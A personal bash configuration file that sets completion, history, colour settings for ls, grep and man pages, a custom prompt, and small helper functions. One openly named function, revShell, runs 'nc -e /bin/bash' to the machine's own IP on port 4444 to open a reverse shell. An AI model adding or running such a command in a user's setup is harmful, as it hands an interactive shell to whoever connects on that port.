#!/bin/bash
#######################################################
# SOURCED ALIAS'S AND SCRIPTS
#######################################################
# Enable bash programmable completion features in interactive shells

if [ -f /usr/share/bash-completion/bash_completion ]; then
	source /usr/share/bash-completion/bash_completion
elif [ -f /etc/bash_completion ]; then
	source /etc/bash_completion
fi

source ./bashrc_aliases
# notify on background completion immediately
set -b

iatest=$(expr index "$-" i)

# Ignore case on auto-completion
# Note: bind used instead of sticking these in .inputrc
if [[ $iatest -gt 0 ]]; then 
    bind "set completion-ignore-case on"; 
fi

# Show auto-completion list automatically, without double tab
if [[ $iatest -gt 0 ]]; then
    bind "set show-all-if-ambiguous On";
fi

#######################################################
# EXPORTS
#######################################################

# Disable the bell
if [[ $iatest -gt 0 ]]; then bind "set bell-style visible"; fi

# Expand the history size
export HISTFILESIZE=10000
export HISTSIZE=500

# Don't put duplicate lines in the history and do not add lines that start with a space
export HISTCONTROL=erasedups:ignoredups:ignorespace

# Check the window size after each command and, if necessary, update the values of LINES and COLUMNS
shopt -s checkwinsize

# Causes bash to append to history instead of overwriting it so if you start a new terminal, you have old session history
shopt -s histappend
PROMPT_COMMAND='history -a'

# Allow ctrl-S for history navigation (with ctrl-R)
stty -ixon

# Set the default editor
export EDITOR=vim
export VISUAL=vim

# To have colors for ls and all grep commands such as grep, egrep and zgrep
export CLICOLOR=1
export LS_COLORS='no=00:fi=00:di=00;34:ln=01;36:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.gz=01;31:*.bz2=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.avi=01;35:*.fli=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.ogg=01;35:*.mp3=01;35:*.wav=01;35:*.xml=00;31:'

# Color for manpages in less makes manpages a little easier to read
export LESS_TERMCAP_mb=$'\E[01;31m'
export LESS_TERMCAP_md=$'\E[01;31m'
export LESS_TERMCAP_me=$'\E[0m'
export LESS_TERMCAP_se=$'\E[0m'
export LESS_TERMCAP_so=$'\E[01;44;33m'
export LESS_TERMCAP_ue=$'\E[0m'
export LESS_TERMCAP_us=$'\E[01;32m'

# Grep color options
export GREP_OPTIONS='--color=auto' 
export GREP_COLOR='1;32'


#######################################################
# SPECIAL FUNCTIONS
#######################################################

# Create and go to the directory
mcd ()
{
    mkdir -p "$1" && cd "$1"
}

# Returns the last 2 fields of the working directory
pwdtail ()
{
    pwd|awk -F/ '{nlast = NF -1;print $nlast"/"$NF}'
}

# Show current network information
netinfo ()
{
    echo "--------------- Network Information ---------------"
    /sbin/ifconfig | awk /'inet addr/ {print $2}'
    echo ""
    /sbin/ifconfig | awk /'Bcast/ {print $3}'
    echo ""
    /sbin/ifconfig | awk /'inet addr/ {print $4}'

    /sbin/ifconfig | awk /'HWaddr/ {print $4,$5}'
    echo "---------------------------------------------------"
}

# For some reason, rot13 pops up everywhere
#rot13 () {
#	if [ $# -eq 0 ]; then
#		tr '[a-m][n-z][A-M][N-Z]' '[n-z][a-m][N-Z][A-M]'
#	else
#		echo "$@" | tr '[a-m][n-z][A-M][N-Z]' '[n-z][a-m][N-Z][A-M]'
#	fi
#}

# Trim leading and trailing spaces (for scripts)
#trim()
#{
#	local var="$@"
#	var="${var#"${var%%[![:space:]]*}"}"  # remove leading whitespace characters
#	var="${var%"${var##*[![:space:]]}"}"  # remove trailing whitespace characters
#	echo -n "$var"
#}

#######################################################
### functions
#######################################################

#COLORED MANUAL PAGES {{{
# @see http://www.tuxarena.com/?p=508
# For colourful man pages (CLUG-Wiki style)

# alias pyt='rlwrap /usr/lib/python2.7/anaconda2/bin/python'
# alias conda_project='/usr/lib/python2.7/anaconda2/bin/anaconda-project'
# alias con='/usr/lib/python2.7/anaconda2/bin/anaconda'
# alias myip="/home/f4lc0n/Scripts/Shell/ipAddr.sh"
# gem install colorls
function cd()
{
    builtin cd "$@" && ls --color
}

function space()
{
    if [[ $1 != "." ]]
    then
        x=$(du -h "$1" | grep -E "$1$" | awk '{print $1}')
        echo "$x"
    else
        x=$(du -h "$1" | grep -E "\.$" | awk '{print $1}')
        echo "$x"
    fi

}
function revShell
{
    ip=$(/home/f4lc0n/Scripts/Shell/ipAddr.sh | grep "Local IP" | awk  '{print $4}')
    echo "$ip"
    nc -e  /bin/bash "$ip" 4444
    echo "Stareted Shell on port 4444. Use nc -lvp 4444 to capture it."
}


# Set the ultimate amazing command prompt
# alias cpu="grep 'cpu ' /proc/stat | awk '{usage=(\$2+\$4)*100/(\$2+\$4+\$5)} END {print usage}' | awk '{printf(\"%.1f\n\", \$1)}'"
function __setprompt
{
    local LAST_COMMAND=$? # Must come first!
    # Define colors
    local LIGHTGRAY="\033[0;37m"
    local WHITE="\033[1;37m"
    local BLACK="\033[0;30m"
    local DARKGRAY="\033[1;30m"
    local RED="\033[0;31m"
    local LIGHTRED="\033[1;31m"
    local GREEN="\033[0;32m"
    local LIGHTGREEN="\033[1;32m"
    local BROWN="\033[0;33m"
    local YELLOW="\033[1;33m"
    local BLUE="\033[0;34m"
    local LIGHTBLUE="\033[1;34m"
    local MAGENTA="\033[0;35m"
    local LIGHTMAGENTA="\033[1;35m"
    local CYAN="\033[0;36m"
    local LIGHTCYAN="\033[1;36m"
    local NOCOLOR="\033[0m"
    PS1="\[${LIGHTMAGENTA}$LAST_COMMAND\]\[${WHITE}\](\[${NOCOLOR}\]\[${LIGHTRED}\]\u\[${YELLOW}\]:\[${GREEN}\]\w\[${WHITE}\])\[${NOCOLOR}\]->"

    # CPU
    # PS1="\[${LIGHTMAGENTA}$LAST_COMMAND\] \[${MAGENTA}\](\[${LIGHTBLUE}\]$(cpu)\[${GREEN}\]%\[${MAGENTA}\])\[${YELLOW}\]"

    # User and server
    local SSH_IP=$(echo "$SSH_CLIENT" | awk '{ print $1 }')
    local SSH2_IP=$(echo "$SSH2_CLIENT" | awk '{ print $1 }')
    if [ "$SSH2_IP" ] || [ "$SSH_IP" ] ; then
        PS1+="\[${BLUE}\](\[${RED}\]\u@\h"
    else
        PS1+="\[${WHITE}\](\[${CYAN}\]\u"
    fi

    # Current directory
    # PS1+="\[${GREEN}\]:\[${BROWN}\]\w\[${DARKGRAY}\]\[${WHITE}\])\[${LIGHTGREEN}\]-"

    # if [[ $EUID -ne 0 ]]; then
    #     PS1+="\[${LIGHTCYAN}\]>\[${NOCOLOR}\]" # Normal user
    # else
    #     PS1+="\[${RED}\]#\[${NOCOLOR}\] " # Root user
    # fi

    # PS2 is used to continue a command using the \ character
    PS2="\[${BLACK}\] \[${DARKGRAY}\]>\[${NOCOLOR}\] "

    # PS3 is used to enter a number choice in a script
    PS3='Please enter a number from above list: '

    # PS4 is used for tracing a script in debug mode
    PS4='\[${DARKGRAY}\]+\[${NOCOLOR}\] '
}

PROMPT_COMMAND='__setprompt'

# Allows global bash env variables to expand when you type them
# If not set, $A/ <TAB> will be \$A/ 
shopt -s direxpand


ii() {
    echo -e "\nYou are logged on ${RED}$HOST"
    echo -e "\nAdditionnal information:$NC " ; uname -a
    echo -e "\n${RED}Users logged on:$NC " ; w -h
    echo -e "\n${RED}Current date :$NC " ; date
    echo -e "\n${RED}Machine stats :$NC " ; uptime
    echo -e "\n${RED}Current network location :$NC " ; scselect
    echo -e "\n${RED}Public facing IP Address :$NC " ;myip
    #echo -e "\n${RED}DNS Configuration:$NC " ; scutil --dns
    echo
}
function mbrc
{
    mv ~/.bashrc ~/bashrc
}
function rbrc
{
    mv ~/bashrc ~/.bashrc
}
# 'command help' for command name and single option - ex: ch ls -A
# see https://github.com/learnbyexample/command_help for a better script version
ch() { 
    whatis $1; man $1 | sed -n "/^\s*$2/,/^$/p" ; 
}

# add path to filename(s)
# usage: ap file1 file2 etc
ap() 
{ 
    for f in "$@"
    do 
        echo "$PWD/$f"
    done
}

shs()
{
    /bin/ps wwTo cmd -H --no-headers | /usr/bin/perl -nle '
        BEGIN { $origin = "<init>"; }
        s/^\s+//; if (/^\S*perl \S*arc_cli\.pl (arc shell .*)/) { $origin = $1; }
        # FIXME?: following patterns may miss explicit interactive shells with options
        if (/^\/\S*bin\/\w*sh$/ || /^-?\w*sh$/) { push @ss, [$_, $origin]; $origin = $_; }
        END {
            printf "%-6s %-12s %-s\n", qw/LEVEL SHELL ORIGIN/; $i = $#ss;
            foreach $sh (reverse @ss) { printf "%-6d %-12s %-s\n", $i--, @$sh; }
        }
    ' 
}

# Man page Rendering 
# Have less display colours
# from: https://wiki.archlinux.org/index.php/Color_output_in_console#man

export LESS_TERMCAP_mb=$(tput bold; tput setaf 2) # green # begin bold
export LESS_TERMCAP_md=$(tput bold; tput setaf 6) # cyan  # begin blink
export LESS_TERMCAP_me=$(tput sgr0)               # reset bold/blink
export LESS_TERMCAP_so=$(tput bold; tput setaf 3; tput setab 4) # yellow on blue  # begin reverse video
export LESS_TERMCAP_se=$(tput rmso; tput sgr0)    # reset reverse video
export LESS_TERMCAP_us=$(tput smul; tput bold; tput setaf 7) # white  # begin underline
export LESS_TERMCAP_ue=$(tput rmul; tput sgr0)    # reset underline
export LESS_TERMCAP_mr=$(tput rev)
export LESS_TERMCAP_mh=$(tput dim)
export LESS_TERMCAP_ZN=$(tput ssubm)
export LESS_TERMCAP_ZV=$(tput rsubm)
export LESS_TERMCAP_ZO=$(tput ssupm)
export LESS_TERMCAP_ZW=$(tput rsupm)
export GROFF_NO_SGR=1                  # for konsole and gnome-terminal
export MANPAGER='less -s -M +Gg'

# 30 – black
# 31 – red
# 32 – green
# 33 – orange
# 34 – blue
# 35 – magenta
# 36 – cyan
# 37 – white


# 0 – reset/normal
# 1 – bold
# 3 – italic/reversed
# 4 – underlined
# 5 – blink

export LESS_TERMCAP_mb=$(printf '\e[01;31m') # enter blinking mode - red
export LESS_TERMCAP_md=$(printf '\e[01;32m') # enter double-bright mode - bold, green
export LESS_TERMCAP_me=$(printf '\e[0m') # turn off all appearance modes (mb, md, so, us)
export LESS_TERMCAP_se=$(printf '\e[0m') # leave standout mode    
export LESS_TERMCAP_so=$(printf '\e[01;33m') # enter standout mode - yellow
export LESS_TERMCAP_ue=$(printf '\e[0m') # leave underline mode
export LESS_TERMCAP_us=$(printf '\e[04;33m') # enter underline mode - cyan

# export LESS_TERMCAP_mb=$(printf '\e[-1;31m') # enter blinking mode
# export LESS_TERMCAP_md=$(printf '\e[01;38;5;75m') # enter double-bright mode
# export LESS_TERMCAP_me=$(printf '\e[-1m') # turn off all appearance modes (mb, md, so, us)
# export LESS_TERMCAP_se=$(printf '\e[0m') # leave standout mode
# export LESS_TERMCAP_so=$(printf '\e[01;33m') # enter standout mode
# export LESS_TERMCAP_ue=$(printf '\e[0m') # leave underline mode
# export LESS_TERMCAP_us=$(printf '\e[04;38;5;200m') # enter underline mode
